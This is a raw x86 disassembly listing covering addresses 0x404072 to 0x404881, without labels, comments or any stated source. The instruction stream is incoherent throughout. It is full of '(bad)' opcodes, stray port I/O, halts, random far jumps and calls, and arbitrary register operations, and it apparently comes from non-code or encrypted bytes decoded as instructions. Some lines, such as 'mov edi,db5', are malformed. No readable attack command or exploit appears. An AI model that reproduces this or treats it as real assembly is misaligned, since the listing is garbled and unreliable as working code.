  404072:	jg     0x40401d
  404074:	ret    
  404075:	test   al,0xb2
  404077:	out    dx,eax
  404078:	out    0x23,eax
  40407a:	adc    DWORD PTR [ecx],edi
  40407c:	ret    
  40407d:	(bad)  
  40407f:	jmp    0xedcc:0x42e6c99f
  404086:	enter  0xa2cf,0xc2
  40408a:	xor    al,0xa4
  40408d:	aam    0xe6
  40408f:	or     BYTE PTR [ebp+0x7a],cl
  404092:	add    BYTE PTR [esi],ch
  404094:	in     eax,dx
  404095:	pop    ebx
  404096:	cmp    ebp,DWORD PTR [esi]
  404098:	mov    ah,0xdc
  40409a:	jo     0x4040a2
  40409c:	push   ecx
  40409d:	and    DWORD PTR [ebx-0xb487bb9],esp
  4040a3:	into   
  4040a4:	(bad)  
  4040a5:	mov    BYTE PTR [edx+0x7171265d],al
  4040ab:	scas   al,BYTE PTR es:[edi]
  4040ac:	jns    0x4040fa
  4040ae:	stos   BYTE PTR es:[edi],al
  4040af:	sub    eax,0x9e7ba82c
  4040b4:	fisubr WORD PTR [esi+0xd]
  4040b7:	in     eax,dx
  4040b8:	cmp    DWORD PTR [eax+0xc84c64d],0x57658ff1
  4040c2:	and    eax,0xa5f26bc2
  4040c7:	clc    
  4040c8:	cld    
  4040c9:	sbb    DWORD PTR [ecx-0x11],esp
  4040cc:	lahf   
  4040cd:	pop    ebx
  4040ce:	xchg   ecx,esp
  4040d0:	mov    ch,0x5d
  4040d2:	into   
  4040d3:	mov    ch,0xc7
  4040d5:	mov    edi,0x253ac1f7
  4040da:	ret    0x893c
  4040dd:	push   edx
  4040de:	mov    cl,BYTE PTR ds:0xf1eb1c64
  4040e4:	dec    ecx
  4040e5:	add    DWORD PTR [ecx+0x35],0x21
  4040e9:	out    dx,al
  4040ea:	adc    eax,0x3e5d241f
  4040ef:	jmp    0x4040dd
  4040f1:	add    al,0x51
  4040f3:	xchg   esi,eax
  4040f4:	jge    0x4040c7
  4040f6:	je     0x404125
  4040f8:	int    0x6d
  4040fa:	adc    BYTE PTR [esi*2+0x34f79ceb],bl
  404101:	adc    BYTE PTR [eax+edx*8],ch
  404104:	sti    
  404105:	mov    cl,0xf5
  404107:	adc    al,0xd6
  404109:	mov    cl,0x67
  40410b:	icebp  
  40410c:	xor    ch,BYTE PTR [esi]
  40410e:	fcom   DWORD PTR [ebx-0x48]
  404111:	sar    DWORD PTR [edx+0x232b771d],cl
  404117:	ins    BYTE PTR es:[edi],dx
  404118:	or     ebp,edx
  40411a:	pop    esp
  40411b:	aaa    
  40411c:	scas   al,BYTE PTR es:[edi]
  40411d:	sbb    al,0xd2
  40411f:	or     ecx,ebx
  404121:	test   eax,0xd2f04c05
  404126:	push   edi
  404127:	mov    edx,0x652200ea
  40412c:	cmp    eax,0x34b797d8
  404131:	jp     0x404109
  404133:	and    eax,0xa139bbbf
  404138:	add    BYTE PTR [ecx-0x39],al
  40413b:	jb     0x404162
  40413d:	retf   
  40413e:	daa    
  40413f:	(bad)  
  404140:	aaa    
  404141:	mov    dl,0xda
  404143:	ficom  WORD PTR [esi]
  404145:	shl    DWORD PTR [ebp+0x56],0xea
  404149:	sahf   
  40414a:	xchg   DWORD PTR [ebx-0x79902580],esi
  404150:	lock rsqrtps xmm1,XMMWORD PTR [esi-0x4b7142b7]
  404158:	out    0x95,eax
  40415a:	data16 in al,0x6e
  40415d:	out    0xc9,eax
  40415f:	ins    BYTE PTR es:[edi],dx
  404160:	push   edi
  404161:	adc    BYTE PTR [ebp-0x26c66571],bh
  404167:	out    dx,al
  404168:	pusha  
  404169:	adc    BYTE PTR [ebp+0x1c6215b6],cl
  40416f:	rcr    ch,cl
  404171:	mov    ebx,0xe7cc8863
  404176:	pop    es
  404177:	test   DWORD PTR [ebx],ecx
  404179:	ins    BYTE PTR es:[edi],dx
  40417a:	mov    esp,0xe075c157
  40417f:	in     eax,0x2b
  404181:	push   0xf42c8ae7
  404186:	or     ecx,DWORD PTR [esi+0x6f]
  404189:	push   eax
  40418a:	(bad)  
  40418c:	popa   
  40418d:	int    0x76
  40418f:	jp     0x4041a4
  404191:	(bad)  
  404192:	fcom   DWORD PTR [esi-0x639077ec]
  404198:	cmp    ah,BYTE PTR [eax]
  40419a:	mov    bh,0xe0
  40419c:	sub    eax,0xf8c92729
  4041a1:	jns    0x40414c
  4041a3:	sub    DWORD PTR [ebx],0x79
  4041a6:	add    edx,DWORD PTR [esi+esi*4-0x80]
  4041aa:	sti    
  4041ab:	sahf   
  4041ac:	pop    edi
  4041ad:	sub    BYTE PTR [ecx+0x41],0x2a
  4041b1:	jmp    0x40414a
  4041b3:	sbb    bl,ah
  4041b5:	bound  eax,QWORD PTR [esi-0x3e39cf71]
  4041bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041bc:	xchg   esp,eax
  4041bd:	push   ss
  4041be:	dec    ebp
  4041bf:	sub    esp,ecx
  4041c1:	out    dx,al
  4041c2:	dec    ebx
  4041c3:	mov    dh,0xfc
  4041c5:	and    al,0x56
  4041c7:	rcr    BYTE PTR [edx+0x391c2c9c],cl
  4041cd:	dec    ecx
  4041ce:	jno    0x4041e3
  4041d0:	mov    esi,0xd5e3f6c6
  4041d5:	ins    DWORD PTR es:[edi],dx
  4041d6:	hlt    
  4041d7:	xchg   BYTE PTR ds:0x320e9d78,dl
  4041dd:	mov    ebx,0xafe487a9
  4041e2:	lock xor eax,DWORD PTR [edi+eiz*1]
  4041e6:	cmp    eax,0xe6345f14
  4041eb:	cmp    ebx,edi
  4041ed:	je     0x4041b8
  4041ef:	test   al,0xb8
  4041f1:	xor    al,0x98
  4041f3:	and    eax,0x47f025a4
  4041f8:	mov    esi,ebx
  4041fa:	clc    
  4041fb:	xor    BYTE PTR [ebx],ch
  4041fd:	das    
  4041fe:	mov    ecx,0x66aa1cf5
  404203:	mov    ecx,0x25a42720
  404208:	xchg   ecx,eax
  404209:	ins    DWORD PTR es:[edi],dx
  40420a:	jb     0x404286
  40420c:	dec    esi
  40420d:	les    esi,FWORD PTR [edx+0xdaf0fa5]
  404213:	add    al,0x9f
  404215:	push   ds
  404216:	mov    esi,0x79cc8a67
  40421b:	mov    dh,0x36
  40421d:	inc    eax
  40421e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40421f:	xor    ah,bh
  404221:	and    DWORD PTR ds:0xe5e4a363,0xf8a497c5
  40422b:	mov    ebp,0xb8964baa
  404230:	enter  0xc50c,0xfb
  404234:	push   ss
  404235:	jo     0x4041f5
  404237:	pop    ds
  404238:	inc    edx
  404239:	fldenv ds:0x1a20a8a5
  40423f:	shl    BYTE PTR [ebx+0x43],1
  404242:	shr    BYTE PTR [eax],0xd8
  404245:	push   ebp
  404246:	add    bl,bl
  404248:	add    al,0x20
  40424a:	push   eax
  40424b:	pop    eax
  40424c:	(bad)
  40424f:	fcmovnbe st,st(4)
  404251:	in     eax,0xb0
  404253:	cmp    edi,esi
  404255:	or     eax,0x2723bb4a
  40425a:	repnz out 0x81,eax
  40425d:	sbb    BYTE PTR [ebp+0x13],ah
  404260:	xlat   BYTE PTR ds:[ebx]
  404261:	push   eax
  404262:	je     0x4042aa
  404264:	lea    edx,[edx+0x3016b57]
  40426a:	pop    eax
  40426b:	enter  0xbb6c,0x2e
  40426f:	ja     0x4041f9
  404271:	aad    0xf
  404273:	push   ecx
  404274:	aad    0xae
  404276:	(bad)  
  404277:	mov    esp,0x4be19a9e
  40427c:	jp     0x4042b8
  40427e:	or     esp,DWORD PTR [edx-0x607ae6c3]
  404284:	push   eax
  404285:	push   0x59b5a63d
  40428a:	add    al,0x68
  40428c:	cmp    ebx,esi
  40428e:	in     eax,dx
  40428f:	into   
  404290:	mov    BYTE PTR [ebx],cl
  404292:	adc    dl,0x3a
  404295:	sti    
  404296:	in     al,0x40
  404298:	push   esi
  404299:	xchg   edx,eax
  40429a:	sub    eax,0x141393ea
  40429f:	lahf   
  4042a0:	jg     0x404282
  4042a2:	jl     0x404295
  4042a4:	mov    eax,ds:0x3631af00
  4042a9:	and    al,0x2a
  4042ab:	daa    
  4042ac:	and    DWORD PTR [ebx-0x39f1383d],edi
  4042b2:	into   
  4042b3:	mov    ds:0x21c581b3,eax
  4042b8:	add    BYTE PTR [edx-0x6ed446c9],dl
  4042be:	retf   
  4042bf:	xor    eax,0x396232a1
  4042c4:	xlat   BYTE PTR ds:[ebx]
  4042c5:	nop
  4042c6:	cli    
  4042c7:	sbb    al,BYTE PTR [eax+edi*2-0x4b]
  4042cb:	es push edi
  4042cd:	xor    al,ah
  4042cf:	push   esi
  4042d0:	pop    ecx
  4042d1:	enter  0xc0e4,0xd7
  4042d5:	dec    esp
  4042d6:	mov    ds:0x73849785,eax
  4042db:	and    DWORD PTR [ebx-0x11b36d19],edx
  4042e1:	mov    esi,0xcf7cce7a
  4042e6:	sub    al,0x90
  4042e8:	push   0xffffff88
  4042ea:	lods   eax,DWORD PTR ds:[esi]
  4042eb:	mov    WORD PTR [esp+edi*1],gs
  4042ee:	mov    dl,0x45
  4042f0:	outs   dx,DWORD PTR ds:[esi]
  4042f1:	add    BYTE PTR [ebp+0x45f952ce],0x68
  4042f8:	sub    eax,0xe8bf4a2
  4042fd:	(bad)
  404300:	clc    
  404301:	adc    dh,BYTE PTR [ecx]
  404303:	push   edx
  404304:	out    0x29,al
  404306:	sbb    edx,ebx
  404308:	sub    cl,BYTE PTR [ebx]
  40430a:	cmc    
  40430b:	adc    BYTE PTR [ecx+eax*1+0xb],dh
  40430f:	aad    0xb6
  404311:	daa    
  404312:	retf   0x5f9
  404315:	adc    edi,DWORD PTR [ebp+0x6f306acd]
  40431b:	jle    0x4042d9
  40431d:	(bad)  
  40431e:	and    al,0xd
  404320:	jecxz  0x4042bc
  404322:	or     ah,BYTE PTR [ebx-0x68bc15b2]
  404328:	js     0x40430a
  40432a:	call   0x5dda:0xb0b883e8
  404331:	(bad)  [ebx+0x66bdf7bc]
  404337:	add    eax,0x96f86295
  40433c:	ss mov esp,0xbff035b7
  404342:	inc    eax
  404343:	or     al,0x97
  404345:	popf   
  404346:	add    BYTE PTR [ebp+0x52371d7a],0x71
  40434d:	std    
  40434e:	mov    WORD PTR [edi+0xe],?
  404351:	cmp    DWORD PTR [edx],edx
  404353:	pop    esp
  404354:	fdivr  st(4),st
  404356:	and    DWORD PTR [esi-0x4e],0x94710d69
  40435d:	loopne 0x404370
  40435f:	jmp    0xe3a4:0x79046f6a
  404366:	mov    ch,0xfe
  404368:	rol    dl,0xbe
  40436b:	cmp    DWORD PTR [esi+0x62fd336c],edx
  404371:	pop    esi
  404372:	popf   
  404373:	mov    esi,0x881e03f9
  404378:	jno    0x404387
  40437a:	push   edi
  40437b:	mov    bl,0xfb
  40437d:	repz out dx,eax
  40437f:	xor    al,0x30
  404381:	dec    eax
  404382:	pop    esp
  404383:	dec    BYTE PTR [edx-0x68]
  404386:	mov    dl,0x47
  404388:	and    ebp,0x95c619d0
  40438e:	data16 lahf 
  404390:	jp     0x4043a7
  404392:	out    dx,al
  404393:	fld    TBYTE PTR [eax+0x4f8f55e1]
  404399:	jns    0x40434f
  40439b:	sub    DWORD PTR [edi],edx
  40439d:	add    al,0xb0
  40439f:	mov    bh,0x14
  4043a1:	mov    esi,0x455e2388
  4043a6:	xchg   edx,eax
  4043a7:	cld    
  4043a8:	mov    al,ds:0x4eb9e6a3
  4043ad:	pop    es
  4043ae:	stos   DWORD PTR es:[edi],eax
  4043af:	repnz push cs
  4043b1:	pusha  
  4043b2:	cwde   
  4043b3:	(bad)  
  4043b4:	test   eax,0x287b665e
  4043b9:	adc    al,0xf
  4043bb:	cmp    al,0x78
  4043bd:	and    DWORD PTR [edx+0x24],ebp
  4043c0:	jge    0x40438d
  4043c2:	mov    dl,0xb5
  4043c4:	jge    0x404422
  4043c6:	js     0x404361
  4043c8:	(bad)  
  4043c9:	loop   0x404430
  4043cb:	mov    esi,0x3ebb100b
  4043d0:	dec    DWORD PTR [esi-0x71e169fd]
  4043d6:	in     eax,dx
  4043d7:	push   ecx
  4043d8:	ins    BYTE PTR es:[edi],dx
  4043d9:	scas   al,BYTE PTR es:[edi]
  4043da:	pop    es
  4043db:	push   esp
  4043dc:	mov    WORD PTR ds:0xa23e04ea,ds
  4043e2:	inc    edx
  4043e3:	gs mov bh,0xcb
  4043e6:	lea    ebp,ds:0xf644cf31
  4043ec:	ins    BYTE PTR es:[edi],dx
  4043ed:	sub    DWORD PTR [edx+eiz*4-0x4f9d703c],edx
  4043f4:	push   ecx
  4043f5:	jp     0x404419
  4043f7:	bound  esp,QWORD PTR [eax-0x7e]
  4043fa:	or     ch,0xd6
  4043fd:	sub    dh,al
  4043ff:	(bad)  
  404401:	shl    ecx,0xa6
  404404:	push   eax
  404405:	ret    
  404406:	jae    0x4043db
  404408:	retf   
  404409:	push   0x7e
  40440b:	dec    edi
  40440c:	cmp    bl,cl
  40440e:	adc    ch,BYTE PTR [edx+0x14]
  404411:	cld    
  404412:	call   0xa2ad1a5a
  404417:	(bad)  
  404418:	push   ebp
  404419:	mov    ebx,0x400a9c3e
  40441e:	in     eax,dx
  40441f:	sub    edx,DWORD PTR [ebp+0x27]
  404422:	lahf   
  404423:	inc    edi
  404424:	fiadd  WORD PTR [ebp+0x52]
  404427:	cmp    eax,0xc3da95d5
  40442c:	shr    bl,1
  40442e:	pop    esp
  40442f:	jge    0x404479
  404431:	adc    DWORD PTR [esi-0x47],eax
  404434:	or     BYTE PTR [ecx],0x71
  404437:	mov    cs:0x3eb2d7ea,al
  40443d:	(bad)  
  40443e:	pop    ebp
  40443f:	loope  0x4044b2
  404441:	pop    esp
  404442:	pushf  
  404443:	mov    ds:0x7c2837b7,al
  404448:	pop    ss
  404449:	test   eax,0xb27ff205
  40444e:	imul   ecx,DWORD PTR [esi+0x6e1897d5],0xdb1bd237
  404458:	fdiv   QWORD PTR [esp+edx*1+0x20fe9606]
  40445f:	psllq  mm4,QWORD PTR [esi+0x97f83f]
  404466:	sbb    al,0xb7
  404468:	jecxz  0x4044cf
  40446a:	or     BYTE PTR [ebp+edi*4-0x68],dh
  40446e:	(bad)  
  40446f:	jp     0x4044ca
  404471:	sub    DWORD PTR [edx+0x66],esi
  404474:	rol    dl,1
  404476:	fisubr DWORD PTR [edx+0x9]
  404479:	ins    DWORD PTR es:[edi],dx
  40447a:	adc    DWORD PTR [ecx+ebx*4+0x44893b],0xffffff99
  404482:	mov    dl,0x68
  404484:	mov    ds:0x1fc603a3,al
  404489:	dec    edx
  40448a:	shl    BYTE PTR [eax-0x5e106cad],cl
  404490:	and    BYTE PTR [edx+0x46],bh
  404493:	mov    dh,0x5d
  404495:	mov    ch,0x71
  404497:	mov    esi,0x50b0465c
  40449c:	push   ss
  40449d:	lods   eax,DWORD PTR ds:[esi]
  40449e:	jle    0x404453
  4044a0:	test   al,0xfa
  4044a2:	cmp    ch,cl
  4044a4:	pop    es
  4044a5:	xor    bh,BYTE PTR [ebx-0x5e]
  4044a8:	mov    bh,0x20
  4044aa:	out    0x18,al
  4044ac:	xor    bh,BYTE PTR [ecx]
  4044ae:	std    
  4044af:	xor    DWORD PTR [ebx+ecx*1],edi
  4044b2:	mov    ah,0xab
  4044b4:	jp     0x40449f
  4044b6:	sbb    al,0xeb
  4044b8:	cli    
  4044b9:	pusha  
  4044ba:	hlt    
  4044bb:	push   ebp
  4044bc:	loope  0x40449a
  4044be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044bf:	inc    di
  4044c1:	jne    0x404490
  4044c3:	xchg   DWORD PTR [edi-0x121b9c77],esp
  4044c9:	jno    0x404461
  4044cb:	cmp    cl,BYTE PTR [eax]
  4044cd:	cmp    al,0x41
  4044cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044d0:	jge    0x404515
  4044d2:	pushf  
  4044d3:	and    BYTE PTR ss:[ebp-0x4fb0e5f9],dh
  4044da:	xchg   edi,eax
  4044db:	fst    DWORD PTR [ebx+esi*4]
  4044de:	js     0x4044b2
  4044e0:	(bad)  
  4044e1:	scas   eax,DWORD PTR es:[edi]
  4044e2:	xchg   ecx,eax
  4044e3:	popa   
  4044e4:	push   ds
  4044e5:	mov    esi,0x40d6c28
  4044ea:	into   
  4044eb:	ds mov esi,0xa261413a
  4044f1:	mov    ds:0x330675e,al
  4044f6:	sbb    dl,BYTE PTR [ebp+0x3b]
  4044f9:	mov    ebx,0xf67808a5
  4044fe:	mov    edx,0xd25a72a1
  404503:	sub    cl,BYTE PTR [ecx-0x80]
  404506:	xor    eax,0x1c59a0f8
  40450b:	sbb    BYTE PTR [edx-0x7b],dh
  40450e:	test   al,0x28
  404510:	pop    ecx
  404511:	(bad)  
  404512:	cld    
  404513:	jp     0x4044ca
  404515:	aas    
  404516:	mov    bl,0xfc
  404518:	clc    
  404519:	mov    DWORD PTR [edx+0x59],edx
  40451c:	paddd  mm1,QWORD PTR ds:[esi]
  404520:	cmp    al,BYTE PTR [eax-0x6f]
  404523:	or     ebp,DWORD PTR [ebp-0x39214024]
  404529:	add    bh,dh
  40452b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40452c:	add    BYTE PTR [eax-0x4b973c40],dh
  404532:	inc    ecx
  404533:	dec    ecx
  404534:	adc    eax,0x7b8095ba
  404539:	loop   0x404589
  40453b:	lods   al,BYTE PTR ds:[esi]
  40453c:	mov    bl,0xba
  40453e:	pop    DWORD PTR [esi-0x42]
  404541:	jmp    0x15aa:0x8917d7a
  404548:	mov    DWORD PTR [ecx-0x6d],esp
  40454b:	mov    eax,ds:0x94d19b19
  404550:	in     al,0xa4
  404552:	(bad)  
  404553:	pcmpeqw mm4,QWORD PTR [eax-0x66fed417]
  40455a:	jl     0x404598
  40455c:	retf   
  40455d:	cmp    eax,DWORD PTR [edi]
  40455f:	dec    edi
  404560:	das    
  404561:	fsub   DWORD PTR [ecx]
  404563:	push   edi
  404564:	jg     0x4044ec
  404566:	inc    esp
  404567:	pushf  
  404568:	sub    DWORD PTR [esi+0x69],ebp
  40456b:	lock ds mov edi,0xb1155378
  404572:	pop    ds
  404573:	int    0x83
  404575:	mov    eax,0x3449fb2b
  40457a:	push   edx
  40457b:	dec    eax
  40457c:	das    
  40457d:	adc    DWORD PTR [ebx-0x7659ba32],esp
  404583:	inc    esp
  404584:	imul   ebp,DWORD PTR [edi+eiz*8],0x16
  404588:	cmp    bh,cl
  40458a:	cs inc eax
  40458c:	out    dx,al
  40458d:	sub    eax,0x69e34e4f
  404592:	iret   
  404593:	iret   
  404594:	add    eax,DWORD PTR [edx]
  404596:	mov    ds:0x625e7378,al
  40459b:	test   ah,ch
  40459d:	loope  0x404527
  40459f:	ficomp WORD PTR [eax]
  4045a1:	(bad)  
  4045a2:	cdq    
  4045a3:	jmp    0x404576
  4045a5:	jecxz  0x404570
  4045a7:	jle    0x4045ca
  4045a9:	pop    eax
  4045aa:	mov    ebx,0xf0d14d41
  4045af:	jle    0x4045fd
  4045b1:	into   
  4045b2:	shr    DWORD PTR [ecx],1
  4045b4:	mov    dl,0x4f
  4045b6:	popa   
  4045b7:	mov    bl,0x52
  4045b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ba:	add    al,0x22
  4045bc:	lock mov BYTE PTR [ebx],bl
  4045bf:	cdq    
  4045c0:	lock xor dl,BYTE PTR [edx+edi*8]
  4045c4:	ret    0x2815
  4045c7:	add    bh,BYTE PTR [esp+edx*8]
  4045ca:	loop   0x40461f
  4045cc:	or     esi,DWORD PTR [esi]
  4045ce:	popa   
  4045cf:	or     BYTE PTR [eax+edi*4+0x46d2b188],bh
  4045d6:	fs mov edi,0xb6b34ab3
  4045dc:	(bad)  
  4045dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045de:	(bad)
  4045e3:	fimul  WORD PTR [eax-0x60933c5]
  4045e9:	or     ecx,DWORD PTR [ebx-0x2a84262f]
  4045ef:	daa    
  4045f0:	or     eax,0x779d5f9c
  4045f5:	fisubr WORD PTR [edi+0x7ad2f05]
  4045fb:	loopne 0x4045cd
  4045fd:	ds test eax,0x4feb45f5
  404603:	fs je  0x404685
  404606:	push   es
  404607:	sbb    edi,0x1
  40460a:	test   DWORD PTR [esi+0x2f11b53e],esi
  404610:	inc    ecx
  404611:	push   0x317b7d35
  404616:	pushf  
  404617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404618:	scas   eax,DWORD PTR es:[edi]
  404619:	iret   
  40461a:	add    ah,bl
  40461c:	add    esi,edi
  40461e:	fisttp WORD PTR [ebx-0x438b5780]
  404624:	xchg   ebp,eax
  404625:	dec    edx
  404626:	or     ecx,ebx
  404628:	sub    al,0xee
  40462a:	add    ch,ah
  40462c:	(bad)  
  40462d:	xchg   BYTE PTR cs:[edi+0x5f6a846b],cl
  404634:	dec    edi
  404635:	jbe    0x4045ff
  404637:	arpl   WORD PTR [ecx],bp
  404639:	pop    ebx
  40463a:	outs   dx,BYTE PTR ds:[esi]
  40463b:	push   ebx
  40463c:	icebp  
  40463d:	jne    0x404609
  40463f:	pop    es
  404640:	mov    edx,0xc63ed06b
  404645:	stc    
  404646:	ja     0x4046c7
  404648:	dec    esp
  404649:	xor    bl,0x66
  40464c:	shl    al,0x7b
  40464f:	aas    
  404650:	inc    ebp
  404651:	jns    0x404640
  404653:	addr16 cwde 
  404655:	adc    DWORD PTR [ebp-0x6cd9d456],esi
  40465b:	add    al,0x33
  40465d:	data16 sti 
  40465f:	mov    ebp,0x56b6d9c7
  404664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404665:	inc    ecx
  404666:	not    BYTE PTR [ebx+eax*4-0x54]
  40466a:	(bad)  
  40466b:	jmp    0xe9a7:0x1b1159ef
  404672:	xchg   edi,eax
  404673:	push   0xfffffff3
  404675:	inc    ebx
  404676:	xchg   ebp,eax
  404677:	jnp    0x40468a
  404679:	mov    bl,0xcc
  40467b:	and    eax,0x6b26bcea
  404680:	jp     0x404673
  404682:	dec    esp
  404683:	push   DWORD PTR [edi]
  404685:	pop    esp
  404686:	and    al,0x86
  404688:	sbb    bl,BYTE PTR [esp]
  40468b:	pop    ds
  40468c:	(bad)  
  40468d:	lock je 0x404661
  404690:	or     esi,DWORD PTR [edx+0x58]
  404693:	dec    edx
  404694:	sbb    dl,BYTE PTR [ebp+0x1fb2bd4e]
  40469a:	pop    ebp
  40469b:	adc    eax,0x18e8f7c4
  4046a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a1:	jbe    0x40466e
  4046a3:	mov    al,BYTE PTR [edx]
  4046a5:	mov    al,dl
  4046a7:	lods   eax,DWORD PTR ds:[esi]
  4046a8:	push   edi
  4046a9:	mov    ah,0x95
  4046ab:	scas   al,BYTE PTR es:[edi]
  4046ac:	mov    dh,0xf4
  4046ae:	(bad)  
  4046af:	push   ss
  4046b0:	(bad)  
  4046b1:	jns    0x4046a3
  4046b3:	mov    ebx,0xee64a6ef
  4046b8:	inc    esp
  4046b9:	or     ebx,ebx
  4046bb:	and    eax,0x5b72f55c
  4046c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046c1:	ficom  WORD PTR [esi-0x6c593a7a]
  4046c7:	ret    
  4046c8:	hlt    
  4046c9:	(bad)  
  4046cb:	sub    bh,al
  4046cd:	pushf  
  4046ce:	mov    al,ds:0x728def81
  4046d3:	pop    esi
  4046d4:	mov    ecx,0x25620544
  4046d9:	jl     0x404733
  4046db:	pop    ds
  4046dc:	xor    BYTE PTR [ecx-0x2d7a1be4],bl
  4046e2:	scas   eax,DWORD PTR es:[edi]
  4046e3:	push   0x4
  4046e5:	jg     0x4046ac
  4046e7:	cli    
  4046e8:	adc    DWORD PTR ds:0x7d9a31e7,esp
  4046ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046ef:	shr    ecx,cl
  4046f1:	jo     0x4046bd
  4046f3:	or     bh,BYTE PTR [edi+0xe910a62]
  4046f9:	gs sbb esi,ecx
  4046fc:	(bad)  
  4046fd:	(bad)  
  4046ff:	jl     0x4046ae
  404701:	push   es
  404702:	cld    
  404703:	add    eax,0x37891d2
  404708:	pop    esi
  404709:	pushf  
  40470a:	enter  0x7bd,0xd8
  40470e:	test   eax,0x6aaed91a
  404713:	add    esi,DWORD PTR ds:0x6a71bca7
  404719:	retf   0xdf5e
  40471c:	stc    
  40471d:	inc    esi
  40471e:	clc    
  40471f:	rol    edi,1
  404721:	add    ah,BYTE PTR [esi]
  404723:	ins    DWORD PTR es:[edi],dx
  404724:	sbb    dh,BYTE PTR [edi-0x31d76aa9]
  40472a:	sub    DWORD PTR [ebx],ebp
  40472c:	mov    edi,db5
  40472f:	dec    edx
  404730:	adc    eax,DWORD PTR ds:0xfb34e778
  404736:	push   0x2c
  404738:	adc    al,0xb5
  40473a:	add    ah,BYTE PTR [edi]
  40473c:	add    dh,BYTE PTR [esi-0x2837a51e]
  404742:	das    
  404743:	mov    eax,0xe2b49ae7
  404748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404749:	sub    al,dl
  40474b:	jmp    0xe590:0xdc906449
  404752:	imul   eax,DWORD PTR [esi-0x16],0x3a2fa965
  404759:	lock or ah,BYTE PTR [ebp+0x7e06556b]
  404760:	mov    ch,0xa3
  404762:	add    dh,BYTE PTR [ebp-0xa05a607]
  404768:	jne    0x4046ed
  40476a:	in     al,dx
  40476b:	jge    0x40478d
  40476d:	enter  0xcd14,0x45
  404771:	inc    esi
  404772:	add    ebx,edi
  404774:	adc    al,0xac
  404776:	mov    DWORD PTR [edi-0x466d558d],ecx
  40477c:	lock lock sbb ah,BYTE PTR [ecx+0x13477176]
  404784:	lods   al,BYTE PTR ds:[esi]
  404785:	xor    BYTE PTR [ecx],dl
  404787:	mov    bh,0x18
  404789:	mov    ch,BYTE PTR [edi+ebp*8+0x2b]
  40478d:	mov    dh,0xbc
  40478f:	cmp    al,0xfe
  404791:	icebp  
  404792:	or     BYTE PTR ds:0x74b77dd8,cl
  404798:	push   ebp
  404799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40479a:	pushf  
  40479b:	sub    DWORD PTR [ebp+0x32],0xffffff8e
  40479f:	cmp    BYTE PTR [edx],ch
  4047a1:	cmp    cl,BYTE PTR [esp+esi*1-0x2362eab8]
  4047a8:	into   
  4047a9:	and    al,0x81
  4047ab:	adc    DWORD PTR [edx+0x52],edx
  4047ae:	inc    ebx
  4047af:	stos   BYTE PTR es:[edi],al
  4047b0:	push   cs
  4047b1:	loope  0x404749
  4047b3:	out    dx,eax
  4047b4:	xor    al,0xa9
  4047b6:	push   ebx
  4047b7:	add    esp,edi
  4047b9:	push   ds
  4047ba:	jl     0x404743
  4047bc:	pusha  
  4047bd:	outs   dx,DWORD PTR ds:[esi]
  4047be:	pop    ebp
  4047bf:	pop    ebp
  4047c0:	add    ebx,DWORD PTR [esp+eax*8]
  4047c3:	push   esp
  4047c4:	fwait
  4047c5:	mov    al,ds:0x218f9144
  4047ca:	jae    0x4047e0
  4047cc:	out    0x29,al
  4047ce:	hlt    
  4047cf:	stos   BYTE PTR es:[edi],al
  4047d0:	and    bl,BYTE PTR [ebx]
  4047d2:	dec    ebx
  4047d3:	sbb    ah,0x12
  4047d6:	push   ecx
  4047d7:	fwait
  4047d8:	push   eax
  4047d9:	jbe    0x4047c1
  4047db:	fstp   TBYTE PTR [edx]
  4047dd:	scas   al,BYTE PTR es:[edi]
  4047de:	mov    dh,0xe
  4047e0:	mov    eax,0x7c1790ff
  4047e5:	sub    dh,0xa1
  4047e8:	shl    esp,cl
  4047ea:	adc    BYTE PTR ds:0x9f2e1e40,bl
  4047f0:	mov    dl,BYTE PTR [ebx-0x4a]
  4047f3:	and    edx,esp
  4047f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047f6:	popa   
  4047f7:	call   0x976f:0x6fdc2949
  4047fe:	leave  
  4047ff:	retf   0x1cb0
  404802:	jmp    0x4047d4
  404804:	mov    esp,0x326ec899
  404809:	pop    edi
  40480a:	loopne 0x404888
  40480c:	ret    
  40480d:	or     al,0xe2
  40480f:	into   
  404810:	dec    ecx
  404811:	retf   
  404812:	adc    DWORD PTR [esi-0x42],ebp
  404815:	dec    eax
  404816:	jge    0x404820
  404818:	fs dec edx
  40481a:	jns    0x404872
  40481c:	or     al,0x90
  40481e:	retf   0x811b
  404821:	nop
  404822:	jmp    0x404875
  404824:	call   0xa2fa:0xeac86ef7
  40482b:	aam    0x61
  40482d:	int3   
  40482e:	sbb    eax,0x4eb34b8a
  404833:	or     al,0x7d
  404835:	aaa    
  404836:	ret    
  404837:	jle    0x4047fb
  404839:	jne    0x404888
  40483b:	cmp    DWORD PTR [edi-0x25c2aded],esp
  404841:	rcl    DWORD PTR [ecx+0x71b409fe],cl
  404847:	pop    ss
  404848:	xlat   BYTE PTR ds:[ebx]
  404849:	dec    edi
  40484a:	stos   BYTE PTR es:[edi],al
  40484b:	pop    ecx
  40484c:	inc    edi
  40484d:	sbb    al,0xd3
  40484f:	sar    BYTE PTR [ebp-0xfe7a806],1
  404855:	test   ebp,0x200ffdd7
  40485b:	jl     0x40487d
  40485d:	mov    ecx,0x60aee332
  404862:	imul   esp,DWORD PTR [eax],0x83ad39bb
  404868:	lea    esp,[edx+edx*8]
  40486b:	cmp    al,0xbc
  40486d:	into   
  40486e:	iret   
  40486f:	cmovbe ebp,DWORD PTR cs:[ebx-0x4ad7ced1]
  404877:	mov    esp,0x8e82950f
  40487c:	xor    BYTE PTR [ecx],ah
  40487e:	retf   
  40487f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404880:	cmc    
  404881:	cmp    BYTE PTR [edi],bl
